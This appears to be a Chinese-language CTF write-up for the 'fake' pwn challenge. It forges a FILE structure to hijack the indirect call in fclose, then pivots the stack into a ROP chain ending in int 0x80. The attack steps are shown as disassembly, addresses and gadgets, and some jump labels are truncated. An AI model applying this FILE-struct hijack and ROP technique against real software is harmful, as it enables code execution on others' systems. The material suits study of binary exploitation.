fake ichunqiu

x: 080EF9E0
ptr_to_File_struct:080EFA00

buffersize = 32


在 fclose里面会 存在 call reg 指令。

伪造FILE结构体，保证第一个字节 (与0x2000 为0)，第一个dword可以为 0xffffefff

然后 会执行到 call [eax+0x8]；
向上数据流分析，eax = [ebx + 0x94]
			 ebx = 是FILE结构体的首地址。

OK，我们只需要让FILE结构体为

0xffffefff + 中间填充0x89字节 + ROP首地址。





# flose 执行轨迹
```
.text:0804F8E0 fclose          proc near
.text:0804F8E0 ; __unwind { // __gcc_personality_v0
.text:0804F8E0                 push    ebp ; Alternative name is '__new_fclose'
.text:0804F8E1                 mov     ebp, esp
.text:0804F8E3                 push    edi
.text:0804F8E4                 push    esi
.text:0804F8E5                 push    ebx
.text:0804F8E6                 sub     esp, 0Ch
.text:0804F8E9                 mov     ebx, [ebp+8]
.text:0804F8EC                 mov     eax, [ebx]
.text:0804F8EE                 test    ah, 20h
.text:0804F8F1                 jnz     loc_804F9C0

.text:0804F8F7                 mov     edx, eax ; step 1
.text:0804F8F9                 and     edx, 8000h
.text:0804F8FF                 jz      loc_804F

.text:0804F905
.text:0804F905 loc_804F905:            ; step 2
.text:0804F905                 shl     eax, 1Ah
.text:0804F908                 sar     eax, 1Fh
.text:0804F90B                 test    edx, edx
.text:0804F90D                 mov     esi, eax
.text:0804F90F                 jz      loc_8

.text:0804F915 loc_804F915:            ; step 3
.text:0804F915                 mov     eax, [ebx+94h]
.text:0804F91B                 sub     esp, 8
.text:0804F91E                 push    0
.text:0804F920                 push    ebx
.text:0804F921                 call    dword ptr [eax+8]
.text:0804F924                 mov     edx, [ebx+68h]
.text:0804F927                 add     esp, 10h
.text:0804F92A                 test    edx, edx
.text:0804F92C                 jle     loc_804FA70
```

# step 2
在地址0x0804F921处劫持控制流，
利用gadget p32(0x08048f66)#  xchg eax, esp ; ret	1  pivot?? exchange 更改栈地址

此处需要 将eax指向栈顶 esp <= eax <=  0x080efaa0

交换之后 esp = 0x080efaa0

ret 之后
esp += 4
esp = 0x080efaa4

# step 3
利用 add esp，"num" gadget 升栈

经过搜索，发现 `0x0804e9aa: add esp, 0xc; ret`
经过升栈之后 `esp = 0x080efab0`

# step 4
使用shellcode

```
xor eax, eax; ret;  // eax = 0
pop ecx ; pop ebx ; ret; 
pop esi ; pop ebx ; pop edx ; ret
pop eax; jnp 0x5b0e5e5e; pop esi; ret;
neg eax; ret
int 0x80
```
